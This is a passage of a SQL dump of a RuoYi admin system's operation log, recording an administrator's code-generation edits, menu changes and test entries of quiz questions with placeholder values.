09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"i', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:24:42', 79);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (149, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercise\",\"className\":\"ExerciseVo\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:24:42\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:24:42\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:24:42\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"i', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:24:59', 75);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (150, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"dataControl/exercise/index\",\"createTime\":\"2023-10-25 09:11:59\",\"icon\":\"edit\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2001,\"menuName\":\"题目管理\",\"menuType\":\"C\",\"orderNum\":1,\"params\":{},\"parentId\":2000,\"path\":\"exercise\",\"perms\":\"dataControl:exercise:list\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:25:36', 50);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (151, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/2002', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:31:55', 83);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (152, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/2001', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:32:00', 15);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (153, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercise\",\"className\":\"ExerciseVo\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:24:59\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:24:59\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:24:59\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"i', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:41:41', 103);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (154, '代码生成', 8, 'com.ruoyi.project.tool.gen.controller.GenController.batchGenCode()', 'GET', 1, 'admin', NULL, '/tool/gen/batchGenCode', '127.0.0.1', '内网IP', '{\"tables\":\"tb_exercises\"}', NULL, 0, NULL, '2023-10-25 09:42:20', 99);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (155, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercise\",\"className\":\"Exercise\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:41:41\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:41:41\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:41:41\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isL', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:47:04', 69);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (156, '代码生成', 8, 'com.ruoyi.project.tool.gen.controller.GenController.batchGenCode()', 'GET', 1, 'admin', NULL, '/tool/gen/batchGenCode', '127.0.0.1', '内网IP', '{\"tables\":\"tb_exercises\"}', NULL, 0, NULL, '2023-10-25 09:47:10', 76);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (157, '菜单管理', 3, 'com.ruoyi.project.system.controller.SysMenuController.remove()', 'DELETE', 1, 'admin', NULL, '/system/menu/2000', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:51:32', 33);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (158, '菜单管理', 1, 'com.ruoyi.project.system.controller.SysMenuController.add()', 'POST', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"createBy\":\"admin\",\"icon\":\"form\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuName\":\"数据管理\",\"menuType\":\"M\",\"orderNum\":5,\"params\":{},\"parentId\":0,\"path\":\"dataControl\",\"status\":\"0\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:54:37', 76);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (159, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercise\",\"className\":\"Exercise\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:47:04\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:47:04\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:47:04\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isL', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 09:54:54', 99);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (160, '题目', 5, 'com.ruoyi.project.csp.controller.ExerciseController.export()', 'POST', 1, 'admin', NULL, '/csp/exercise/export', '127.0.0.1', '内网IP', '{\"exerciseType\":\"1\",\"pageSize\":\"10\",\"pageNum\":\"1\",\"exerciseTitle\":\"123\",\"quesType\":\"1\"}', NULL, 0, NULL, '2023-10-25 10:41:56', 4162);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (161, '题目', 5, 'com.ruoyi.project.csp.controller.ExerciseController.export()', 'POST', 1, 'admin', NULL, '/csp/exercise/export', '127.0.0.1', '内网IP', '{\"exerciseType\":\"1\",\"pageSize\":\"10\",\"pageNum\":\"1\",\"exerciseTitle\":\"123\",\"quesType\":\"1\"}', NULL, 0, NULL, '2023-10-25 10:42:50', 105);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (162, '题目', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/csp/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"123\",\"choiceA\":\"123\",\"choiceB\":\"123\",\"choiceC\":\"123\",\"choiceD\":\"123\",\"correctAnswer\":\"123\",\"createTime\":\"2023-10-25 10:52:21\",\"exerciseTitle\":\"12312312\",\"exerciseType\":1,\"id\":1,\"isDelete\":123,\"params\":{},\"quesType\":0}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 10:52:21', 27);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (163, '题目', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/csp/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"123\",\"choiceA\":\"123\",\"choiceB\":\"123\",\"choiceC\":\"123\",\"choiceD\":\"123\",\"correctAnswer\":\"123\",\"createBy\":\"\",\"createTime\":\"2023-10-25 10:52:21\",\"exerciseTitle\":\"1231231212312321\",\"exerciseType\":1,\"id\":1,\"isDelete\":0,\"params\":{},\"quesType\":0,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 11:06:16\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 11:06:16', 54);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (164, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercise\",\"className\":\"Exercise\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:54:54\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:54:54\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 09:54:54\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isL', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 11:10:00', 147);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (165, '题目', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/csp/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"123\",\"choiceA\":\"123asd\",\"choiceB\":\"123\",\"choiceC\":\"123\",\"choiceD\":\"123\",\"correctAnswer\":\"123\",\"createBy\":\"\",\"createTime\":\"2023-10-25 10:52:21\",\"exerciseTitle\":\"1231231212312321\",\"exerciseType\":1,\"id\":1,\"isDelete\":0,\"params\":{},\"quesType\":0,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 11:10:15\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 11:10:15', 36);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (166, '题目管理', 2, 'com.ruoyi.project.csp.controller.ExerciseController.edit()', 'PUT', 1, 'admin', NULL, '/csp/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"123\",\"choiceA\":\"123asd\",\"choiceB\":\"123123\",\"choiceC\":\"123\",\"choiceD\":\"123\",\"correctAnswer\":\"123\",\"createBy\":\"\",\"createTime\":\"2023-10-25 10:52:21\",\"exerciseTitle\":\"1231231212312321\",\"exerciseType\":1,\"id\":1,\"isDelete\":0,\"params\":{},\"quesType\":0,\"updateBy\":\"admin\",\"updateTime\":\"2023-10-25 11:14:50\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 11:14:50', 65);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (167, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/csp/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"asd\",\"choiceA\":\"as da s\",\"choiceB\":\"asda\",\"choiceC\":\"sdasd\",\"choiceD\":\"asdasda\",\"correctAnswer\":\"ad\",\"createBy\":\"admin\",\"createTime\":\"2023-10-25 11:15:15\",\"exerciseTitle\":\"21331231\",\"exerciseType\":0,\"id\":2,\"params\":{},\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-10-25 11:15:15', 29);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (168, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exercise\",\"className\":\"Exercise\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":1,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 11:10:00\",\"usableColumn\":false},{\"capJavaField\":\"ExerciseTitle\",\"columnComment\":\"题目描述\",\"columnId\":2,\"columnName\":\"exercise_title\",\"columnType\":\"text\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"textarea\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"exerciseTitle\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 11:10:00\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceA\",\"columnComment\":\"选项A\",\"columnId\":3,\"columnName\":\"choice_a\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"choiceA\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":1,\"updateBy\":\"\",\"updateTime\":\"2023-10-25 11:10:00\",\"usableColumn\":false},{\"capJavaField\":\"ChoiceB\",\"columnComment\":\"选项B\",\"columnId\":4,\"columnName\":\"choice_b\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-10-24 09:20:25\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isL', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, 